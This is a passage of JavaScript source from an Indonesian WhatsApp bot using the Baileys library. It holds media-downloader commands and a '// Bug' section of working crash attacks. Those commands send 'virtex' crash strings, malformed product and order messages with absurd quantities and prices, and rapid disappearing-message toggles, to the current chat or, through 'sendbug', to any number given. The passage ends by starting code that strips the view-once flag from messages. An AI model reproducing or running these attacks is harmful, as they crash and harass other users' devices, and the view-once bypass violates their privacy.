              pemuda.relayWAMessage(prep)
              break      
      case 'cewevietnam':
      case 'randomvietnam':
      case 'randomcewevietnam':
              v = await hx.pinterest('cewevietnam')
              v2 = v[Math.floor(Math.random() * v.length)]
              buff = await getBuffer(v2)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await pemuda.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
              contentText:`Nih Kack`,buttons,headerType:4}
              prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              pemuda.relayWAMessage(prep)
              break
      case 'ceweindo':
      case 'randomindo':
      case 'randomceweindo':
              v = await hx.pinterest('ceweindo')
              v2 = v[Math.floor(Math.random() * v.length)]
              buff = await getBuffer(v2)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await pemuda.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
              contentText:`Nih Kack`,buttons,headerType:4}
              prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              pemuda.relayWAMessage(prep)
              break                                		            				                      	            		            				                                             		            				                      	            		            				             
           		            				                      	            		            				                        		            				                      	            		            				                        		            				                      	            		            				             
//---------------< Download >--------------                                   
     case 'pinterest': 
              if(!q) return freply('Cari apa?')   
              const nganu = args.join(' ')                         
              let pin = await hx.pinterest(q);
              let ac = pin[Math.floor(Math.random() * pin.length)];
              let di = await getBuffer(ac);
              buttons = [{buttonId: `${prefix + command} ${q}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await pemuda.prepareMessageMedia(di, "imageMessage", { thumbnail: di, })).imageMessage
              buttonsMessage = {footerText:'Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
              contentText:`Nih Kack`,buttons,headerType:4}
              prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              pemuda.relayWAMessage(prep)
              break                                                                                                                  
    case 'tiktok': 
    case 'ttdl':
              //if (!isRegister) return freply(mess.only.regis)         
              if (!q) return freply('Linknya?')
              if (!q.includes('tiktok')) return freply(mess.error.Iv)
              freply(mess.wait)
              anu = await TiktokDownloader(`${q}`)
              .then((data) => { sendMediaURL(from, data.result.nowatermark) })
              .catch((err) => { freply(String(err)) })
              break
    case 'ttnowm': 
    case 'tiktoknowm':
              //if (!isRegister) return freply(mess.only.regis)         
              if (!q) return freply('Linknya?')
              if (!q.includes('tiktok')) return freply(mess.error.Iv)
              freply(mess.wait)
              anu = await TiktokDownloader(`${q}`)
              .then((data) => { sendMediaURL(from, data.result.nowatermark) })
              .catch((err) => { freply(String(err)) })
              break           
     case 'ig':
             //if (!isRegister) return freply(mess.only.regis)          
             if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return freply(mess.Iv)
             if (args.length < 1) return freply('Link?')
             lin = args[0]          
             hx.igdl(lin).then(res => {             
             Anu = res[0].downloadUrl
             fto = potogw
             pemuda.sendMessage(from, fto, image, {quoted:mek, caption:`*𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 𝗠𝗣4🍁*
             
•🌹Priview : ${res[0].preview}
•🌹Link : ${res[0].url}
•🌹Linkdl : ${res[0].downloadUrl}

Please wait, the media file is being sent it may take a few minutes`, thumbnail:potofake, contextInfo:{forwardingScore: 989, isForwarded: true}})
             sendMediaURL(from, Anu, 'Done!')
             })
             break             
    case 'fbmp4':
             //if (!isRegister) return freply(mess.only.regis)         
             if (args.length < 1) return freply('Link?')
             lin = args[0]             
             hx.fbdown(lin).then(res => {           
             Anu = res.HD
             fto = potogw
             pemuda.sendMessage(from, fto, image, {quoted:mek, caption:`*𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗠𝗣4🍁*
             
•🌹Normal : ${res.Normal_video}
•🌹Hd : ${res.HD}
•🌹Audio : ${res.audio}

_Please wait, the media file is being sent it may take a few minutes`, thumbnail:potofake, contextInfo:{forwardingScore: 989, isForwarded: true}})
             sendMediaURL(from, Anu, 'Done!')
             })
             break
    case 'fbmp3':
             //if (!isRegister) return freply(mess.only.regis)         
             if (args.length < 1) return freply('Link?')
             lin = args[0]             
             hx.fbdown(lin).then(async (res) => {             
             Anu = res.HD
             fto = potogw
             pemuda.sendMessage(from, fto, image, {quoted:mek, caption:`*𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗠𝗣3🍁*
             
•🌹Normal : ${res.Normal_video}
•🌹Hd : ${res.HD}
•🌹Audio : ${res.audio}

Please wait, the media file is being sent it may take a few minutes`, thumbnail:potofake, contextInfo:{forwardingScore: 989, isForwarded: true}})
             khs = await getBuffer(Anu)
             pemuda.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp4', filename:'pemudagans.mp3', ptt:true})
             })
             break             
    case'twitter':
             //if (!isRegister) return freply(mess.only.regis)         
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return freply(mess.Iv)
             if (!q) return freply('Linknya?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
             .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'DONE')
             })
             break 
     case 'ytdl':
       case 'ytmp3':      
         case 'ytmp4':      
     case 'play':      
     case 'youtube':       
     case 'youtubedl':  
             //if (!isRegister) return freply(mess.only.regis)      	                              
             if (args.length < 1) return reply(`Kirim perintah *${prefix}play query`)
             reply('Searching...')
             let yut = await yts(q)
             yta(yut.videos[0].url)             
             .then(async(res) => {
             const { thumb, title, filesizeF, filesize } = res
             const capti = `𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗣𝗟𝗔𝗬🍁
		     
•🌹Judul : ${yut.all[0].title}
•🌹ID Video : ${yut.all[0].videoId}
•🌹️Diupload Pada : ${yut.all[0].ago}
•🌹️Views : ${yut.all[0].views}
•🌹Durasi : ${yut.all[0].timestamp}
•🌹Channel : ${yut.all[0].author.name}
•🌹Link Channel : ${yut.all[0].author.url}`
             ya = await getBuffer(thumb)
             py =await pemuda.prepareMessage(from, ya, image)
             gbutsan = [{buttonId: `${prefix}buttonmusic ${yut.all[0].url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},{buttonId: `${prefix}buttonvideo ${yut.all[0].url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}]
             gbuttonan = {
             imageMessage: py.message.imageMessage,
             contentText: capti,
             footerText: 'Silahkan Pilih Jenis File Dibawah Ini☕',
             buttons: gbutsan,
             headerType: 4
}
             await pemuda.sendMessage(from, gbuttonan, MessageType.buttonsMessage)})
             break                                                        
      case 'buttonmusic':
             //if (!isRegister) return freply(mess.only.regis)      	     
             if(!c) return reply('linknya?')              
             res = await yta(`${c}`).catch(e => {
             reply('```[ ! ] Error Saat Mengirim Audio```')})
             sendMediaURL(from, `${res.dl_link}`,{quoted:mek})
             break         
     case 'buttonvideo':
             //if (!isRegister) return freply(mess.only.regis)      	     
             if(!c) return reply('linknya?')            
             res = await ytv(`${c}`).catch(e => {
             reply('```[ ! ] Error Saat Mengirim Video```')})
             sendMediaURL(from, `${res.dl_link}`,'Nih Kack')
             break             
 	case 'ytsearch':
             //if (!isRegister) return freply(mess.only.regis)      	
		 	 if (args.length < 1) return freply('Tolong masukan query!')
			 var srch = args.join('');
	  		 try {
          	 var aramas = await yts(srch);
   			 } catch {
        	 return await pemuda.sendMessage(from, 'Error!', MessageType.text, dload)
    		 }
    		 aramat = aramas.all 
    	 	 var tbuff = await getBuffer(aramat[0].image)
    		 var ytresult = '';
    		 ytresult += '𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗦𝗘𝗔𝗥𝗖𝗛🍁'
    	 	 ytresult += '\n⌬━━━━━━━━━━━━⌬\n\n'
   			 aramas.all.map((video) => {
        	 ytresult += '•🌹Title: ' + video.title + '\n'
             ytresult += '•🌹Link: ' + video.url + '\n'
             ytresult += '•🌹Durasi: ' + video.timestamp + '\n'
             ytresult += '•🌹Upload: ' + video.ago + '\n⌬━━━━━━━━━━━━⌬\n\n'
    	 	 });    	 	 
    	     await fakethumb(tbuff,ytresult)
			 break  			
    case 'twmp4':
             //if (!isRegister) return freply(mess.only.regis)         
             if (args.length < 1) return freply('Link?')
             lin = args[0]            
             hx.twitter(lin).then(res => {             
             Anu = res.SD
             fto = potogw
             pemuda.sendMessage(from, fto, image, {quoted:mek, caption:`*𝗧𝗪𝗜𝗧𝗧𝗘𝗥 𝗠𝗣4🍁*
•🌹Hd : ${res.HD}
•🌹Sd : ${res.SD}
•🌹Audio : ${res.audio}

Please wait, the media file is being sent it may take a few minutes`, thumbnail:potofake, contextInfo:{forwardingScore: 989, isForwarded: true}})
             sendMediaURL(from, Anu, 'Done!')
             })
             break
    case 'twmp3':
             //if (!isRegister) return freply(mess.only.regis)         
             if (args.length < 1) return freply('Link?')             
             lin = args[0]             
             hx.twitter(lin).then(async (res) => {           
             Anu = res.SD
             fto = potogw
             pemuda.sendMessage(from, fto, image, {quoted:mek, caption:`*𝗧𝗪𝗜𝗧𝗧𝗘𝗥 𝗠𝗣3🍁*
•🌹Hd : ${res.HD}
•🌹Sd : ${res.SD}
•🌹Audio : ${res.audio}

Please wait, the media file is being sent it may take a few minutes`, thumbnail:potofake, contextInfo:{forwardingScore: 989, isForwarded: true}})
             khs = await getBuffer(Anu)
             pemuda.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'pemudagan.mp3', quoted:mek, ptt:true})
             })
             break	
                                                                                                                                                    
//<---------------< Bug >---------->  
      case 'sendbug':
           pemuda.relayWAMessage(global.mm=pemuda.
           prepareMessageFromContent(`${body.slice(9)}`, pemuda.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:!0})
           freply('Sukses')
           break			
    case 'bug': 
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)       
           if (args.length < 1) return freply('Jumlahnya?')                  
           for (let i = 0; i < args[0]; i++) {
           pemuda.relayWAMessage(global.mm=pemuda.
           prepareMessageFromContent(from, pemuda.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:!0})
}
           break 
    case 'buggc': 
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)    
           freply('Bwhahahwahaha')
           await pemuda.toggleDisappearingMessages(from)
           pemuda.sendMessage(from, `Aqokqowkej`)
           break                                 
    case 'bughole':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           break  
    case 'bugholeattack':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})
           pemuda.sendMessage(from, hole(prefix), MessageType.text, {quoted: ftroli})           
           break

    case 'virtex':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           freply(`${ngazap(prefix)}`)
           freply(`${emoji2(prefix)}`)
           break                                                                                                                                                                                                                                                                                           
    case 'virtexattack':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           freply(`${es(prefix)}`)
           freply(`${api(prefix)}`)
           freply(`${naga(prefix)}`)
           freply(`${korak(prefix)}`)
           freply(`${black(prefix)}`)
           freply(`${beku(prefix)}`)
           freply(`${ngazap(prefix)}`)
           freply(`${mata(prefix)}`)
           freply(`${emoji2(prefix)}`)
           freply(`${petasan(prefix)}`)
           freply(`${virtex(prefix)}`)
           freply(`${virtex2(prefix)}`)
           freply(`${virtex3(prefix)}`)
           freply(`${virtex4(prefix)}`)
           freply(`${virtex5(prefix)}`)
           freply(`${virtex6(prefix)}`)
           freply(`${virtex7(prefix)}`)
           freply(`${virtex8(prefix)}`)
           freply(`${virtex9(prefix)}`)
           freply(`${virtag(prefix)}`)                                                               
           break
                                                                                                                                                                                                                                       
	case 'xbug':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
           await pemuda.toggleDisappearingMessages(from, 0)
	   	   break
    case 'command':
            res = await pemuda.prepareMessageFromContent(from,{
           "listMessage": {
           "title": `*${waktoonyabro}*`,
           "description": "Iist Menu Disini Ya☕",
           "buttonText": "CLICK HERE",
           "listType": "SINGLE_SELECT",
           "sections": [
           {
           "title": `${ngazap} ${virtag}`,
           "rows": [
           {
           "title": "Banned",
           "rowId": "Banned"
           }
           ]
           }
           ]
           }
           }, {quoted: ftroli})
           pemuda.relayWAMessage(res)
           break	   	            
    // Bug Catalog
    case 'pcp':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           buf = potofake
           imeu = await pemuda.prepareMessage('0@s.whatsapp.net', buf, image) 
           imeg = imeu.message.imageMessage
           res = await pemuda.prepareMessageFromContent(from,{
           "productMessage": {
           "product": {
           "productImage": imeg,
           "productId": "150453297177375",
           "title": `${fake} ${ngazap} ${virtag}`,
           "description": `${virtex}`,
           "currencyCode": "IDR",
           "priceAmount1000": "99999999999999999999999999999999",
           "productImageCount": 1
           },
           "businessOwnerJid": `${ownerNumber}@s.whatsapp.net`,
           "contextInfo": {
           "forwardingScore": 3,
           "isForwarded": true
           }
           }
           }, {quoted:bugtrol, contextInfo:{}}) 
           pemuda.relayWAMessage(res)
           break
      // Bug Invite Group ( MyMans APIs )
     case 'pgp':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           buf = potofake
           imeu = await pemuda.prepareMessage('0@s.whatsapp.net', buf, image) 
           imeg = imeu.message.imageMessage
           res = await pemuda.prepareMessageFromContent(from,{
           "groupInviteMessage": {
           "groupJid": "85296556573-1328272333@g.us",
           "inviteCode": "wFHwtOxGQN8OwK2x",
           "inviteExpiration": "162533333338378",
           "groupName": `${fake} ${ngazap} ${virtag}`,
           "jpegThumbnail": `fakeimage`,          
           "caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
           "contextInfo": {
           "forwardingScore": 3,
           "isForwarded": true
}
}
           }, {quoted:imeu, contextInfo:{}})
           pemuda.relayWAMessage(res)
           await setTimeout(() => {
           freply('CHANDRA Nih Bousss')
           }, 3000)
           break          
    case 'psp': // BUG TROLLI + BUG GC + TROLLI
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           buf = potofake
           imeu = await pemuda.prepareMessage('0@s.whatsapp.net', buf, image) 
           imeg = imeu.message.imageMessage
           res = await pemuda.prepareMessageFromContent(from,{
           "orderMessage": {
           "orderId": "150453297177375",
           "thumbnail": `fakeimage`,         
           "itemCount": 1000000000000,
           "status": "INQUIRY",
           "surface": "CATALOG",
           "orderTitle": "CHANDRA ~ Hacker 404",
           "message":"Hacker By Chandra",
           "sellerJid": `${ownerNumber}@s.whatsapp.net`,
           "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
           "totalAmount1000": "99999999999999999999",
           "totalCurrencyCode": "IDR",
           "contextInfo": {
           "forwardingScore": 3,
           "isForwarded": true
           }
           }
           }, {quoted:bugtrol, contextInfo:{}}) 
           pemuda.toggleDisappearingMessages(from, 'Awoakwoakwoak')
           pemuda.relayWAMessage(res)
           break
    case 'p': // TROLLI
           buf = potofake
           imeu = await pemuda.prepareMessage('0@s.whatsapp.net', buf, image) 
           imeg = imeu.message.imageMessage
           res = await pemuda.prepareMessageFromContent(from,{
           "orderMessage": {
           "orderId": "150453297177375",
           "thumbnail": `fakeimage`,          
           "itemCount": 2021,
           "status": "INQUIRY",
           "surface": "CATALOG",
           "orderTitle": "CHANDRA ~ Hacker 404",
           "message":"Hallo Kak",
           "sellerJid": `${ownerNumber}@s.whatsapp.net`,
           "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
           "totalAmount1000": "99999999999999999999",
           "totalCurrencyCode": "IDR",
           "contextInfo": {
           "forwardingScore": 3,
           "isForwarded": true
           }
           }
           }, {quoted:imeu, contextInfo:{}}) 
           pemuda.relayWAMessage(res)
           break

case 'bugtroli':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           function sleep(ms) {
           return new Promise(resolve => setTimeout(resolve, ms))}
           function troli(nomor){
           pemuda.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
quoted: {
        key: {
           participant: '0@s.whatsapp.net'},
           message: {
           orderMessage: {
           thumbnail: fakeimage,
           itemCount: -96976930347493737473837382920202049, // Bug
           status: 1,
           surface: 1,
           message: '☠️Asylum☠️',
           orderTitle: 'AsylumVirus️', 
           sellerJid: '0@s.whatsapp.net'}}}}
)}
           function bug(jid){
           for(let i=0;i < 1;i++){
           var
           WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
           pemuda.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
           async function attack(targett){
           bug(targett)
           await sleep(100)
           troli(targett)
           await sleep(100)
           bug(targett)
}
           attack(mek.key.remoteJid)
           break                      	   	   	   	   	   	   	   	   
    case 'jadivirus':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
           encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
           file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
           value = args.join(" ")
           var group = await pemuda.groupMetadata(from)
           var member = group['participants']
           var mem = []
           member.map(async adm => {
           mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
           var options = {
           contextInfo: { mentionedJid: mem },
           quoted: mek
           }
           ini_buffer = fs.readFileSync(file)
           pemuda.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, ftroli})
           fs.unlinkSync(file)
           } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
           file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
           value = args.join(" ")
           var group = await pemuda.groupMetadata(from)
           var member = group['participants']
           var mem = []
           member.map(async adm => {
           mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
           var options = {
           contextInfo: { mentionedJid: mem },
           quoted: mek
           }
           ini_buffer = fs.readFileSync(file)
           pemuda.sendMessage(from, ini_buffer, image, { thumbnail : virgam, ftroli, options})
           fs.unlinkSync(file)
           } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
           encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
           file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
           value = args.join(" ")
           var group = await pemuda.groupMetadata(from)
           var member = group['participants']
           var mem = []
           member.map(async adm => {
           mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
           var options = {
           mimetype : 'audio/mp4',
           ptt : true,
           contextInfo: { mentionedJid: mem },
           quoted: mek
           }
           ini_buffer = fs.readFileSync(file)
           pemuda.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, ftroli})
           fs.unlinkSync(file)
           }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
           encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
           file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
           value = args.join(" ")
           var group = await pemuda.groupMetadata(from)
           var member = group['participants']
           var mem = []
           member.map(async adm => {
           mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
           var options = {
           mimetype : 'video/mp4',
           contextInfo: { mentionedJid: mem },
           quoted: mek
           }
           ini_buffer = fs.readFileSync(file)
           pemuda.sendMessage(from, ini_buffer, video, { thumbnail : virgam, ftroli})
           fs.unlinkSync(file)
           } else{
           freply(`reply gambar/video dengan caption ${prefix}jadivirus`)
           }
           break
    case 'tovirgam':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
	  	   if (!isQuotedSticker) return freply('Reply stiker nya')
    	   if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
		   const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	  	   const media = await pemuda.downloadAndSaveMediaMessage(encmedia)
		   const upload = await uploadimg(media, Date.now() + '.webp')
		   console.log(upload)
		   reply(`${upload.result.image}`)
		   const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
	  	   console.log(rume.data)
		   sendMediaURL(from, rume.data.result)
		   } else {
		   const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		   const media = await pemuda.downloadAndSaveMediaMessage(encmedia)
	 	   ran = '1000.png'
		   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
		   fs.unlinkSync(media)
		   if (err) return reply(mess.error.api)
		   buffer = fs.readFileSync(ran)
		   pemuda.sendMessage(from, buffer, image, {quoted: mek, thumbnail: virgam, caption: 'Nih Fotonya\n\n⚠️ *Perhatian.!!* ⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
	 	   fs.unlinkSync(ran)})
           }
	       break	   	   		   
     case'jadivilip': 
           var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
           var media = await pemuda.downloadAndSaveMediaMessage(encmedia)
           var ran = getRandom('.mp4')            
           freply('Oke kak saya kirim diprivate ya!!')
           exec(`ffmpeg -i ${media} ${ran}`, (err) => {
           fs.unlinkSync(media)
           if (err) return freply('```[ ! ] Error Saat Mengirim...```')
           var buffer = fs.readFileSync(ran)
           pemuda.sendMessage(sender, buffer, document, {mimetype: 'audio/mp3', filename: `V ${pushname} ${beku(prefix)}.mp3`, quoted: mek})
           fs.unlinkSync(ran)
})
           if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
           let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           let media = await pemuda.downloadMediaMessage(encmedia)
           pemuda.sendMessage(sender, media, document, { quoted: mek, filename:`${pushname} ${api(prefix)}`, mimetype: 'image/jpeg' })
           } else {
	       freply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)
}
	       break

     case 'jadiselayer2':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
     
           if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
	       let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           let media = await pemuda.downloadMediaMessage(encmedia)
           res = pemuda.prepareMessageFromContent(from,{
		   "productMessage": {
		   "product": {
		   "productImage": {
		   "url": m.quoted.url,
		   "mimetype": "image/jpeg",
		   "fileSha256": m.quoted.fileSha256.toString('base64'),
		   "fileLength": "129846",
		   "height": m.quoted.height,
		   "width": m.quoted.width,
		   "mediaKey": m.quoted.mediaKey.low,
		   "fileEncSha256": "Lz0NZ3Ef3SnQPjBgIORJQOl+bh+MhfUkHAJZ4cpfJMs=",
		   "directPath": "/v/t62.7118-24/35386448_4378267175625274_3393924682034345059_n.enc?ccb=11-4&oh=66cd48ad74d1e8199b8403ab03e2e964&oe=61931230",
		   "mediaKeyTimestamp": "1634534558",
		   "jpegThumbnail": media},
		   "productId": "4014159192027037",
		   "title": `${beku(prefix)}`,
		   "description": `${pushname} ${es(prefix)}`,
		   "currencyCode": "IDR",
		   "priceAmount1000": "999999999999000",
		   "productImageCount": 1
},
		   "businessOwnerJid": "6285894399311@s.whatsapp.net"}},{quoted: mek})
            pemuda.relayWAMessage(res)
            } else {
		    freply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)}
	        break	
     case 'jadiselayer':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)     
           if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
	       let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           let media = await pemuda.downloadMediaMessage(encmedia)
           res = pemuda.prepareMessageFromContent(from,{
		   "productMessage": {
 		   "product": {
		   "productImage": {
		   "url": m.quoted.url,
           "mimetype": "image/jpeg",
           "fileSha256": m.quoted.fileSha256.toString('base64'),
           "fileLength": "129846",
           "height": m.quoted.height,
           "width": m.quoted.width,
           "mediaKey": m.quoted.mediaKey.low,
           "fileEncSha256": "+8eP//MYvZg89HFVffhWEpHp/Z0N2KiRoOQ15QXUUWw=",
           "directPath": "/v/t62.7118-24/11690708_244589397707003_563010695040056786_n.enc?ccb=11-4&oh=1fb7bf002e1a8e307f43f3964fe60cf2&oe=619270DD",
           "mediaKeyTimestamp": "1634534253",
           "jpegThumbnail": media},
           "productId": "6349482305092740",
           "title": `${naga(prefix)}`,
           "description": `${pushname} ${api(prefix)}`,
           "productImageCount": 1
},
           "businessOwnerJid": "6281220670449@s.whatsapp.net"}},{quoted: mek})
            pemuda.relayWAMessage(res)
            } else {
	   	    freply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)}
            break      
      case 'jadiselayer3':
     	   if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
            if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
         	let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            let media = await pemuda.downloadMediaMessage(encmedia)
            res = pemuda.prepareMessageFromContent(from,{
            "productMessage": {
            "product": {
            "productImage": {
            "url": m.quoted.url,
            "mimetype": "image/jpeg",
            "fileSha256": m.quoted.fileSha256.toString('base64'),
            "fileLength": "129846",
            "height": m.quoted.height,
            "width": m.quoted.width,
            "mediaKey": m.quoted.mediaKey.low,
            "fileEncSha256": "xmbYKbQb8QPnzAOa9pNV1CNNGBySoofvNBiq/VuIHs4=",
            "directPath": "/v/t62.7118-24/34636480_178324171132057_5653707513186068677_n.enc?ccb=11-4&oh=b288af3048eed1129aee109df4920780&oe=6191CBB4",
            "mediaKeyTimestamp": "1634508700",
            "jpegThumbnail": media},
            "productId": "6349482305092740",
            "title": `${korak(prefix)}`,
            "description": `${pushname} ${petasan(prefix)}`,
            "productImageCount": 1
},
			"businessOwnerJid": sender}},{quoted: mek})
            pemuda.relayWAMessage(res)
            } else {
		    freply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)}
            break
                       
 default:
 	if (isCmd) {
				tidakada = `[ ! ] Hai *${pushname}* \nCommand *!${command}* tidak tersedia, Silahkan cek fitur  di Menu`
tidakk = [{buttonId: `.menu`, buttonText: {displayText: 'MENU BOT'}, type: 1}]
const tidakbutton = {
    contentText: `${tidakada}`,
    footerText: 'Command Tidak Ditemukan',
    buttons: tidakk,
    headerType: 1
}
pemuda.sendMessage(from, tidakbutton, MessageType.buttonsMessage, {quoted: mek, contextInfo: {"mentionedJid": [sender]}})
}
break
if (isGroup && isAntiVO && m.mtype == 'viewOnceMessage'){
var msg = {...mek}

let typenya = msg.message.viewOnceMessage.message["videoMessage"] ?
msg.message.viewOnceMessage.message.videoMessage : msg.message.viewOnceMessage.message.imageMessage
        
typenya["viewOnce"] = false
            
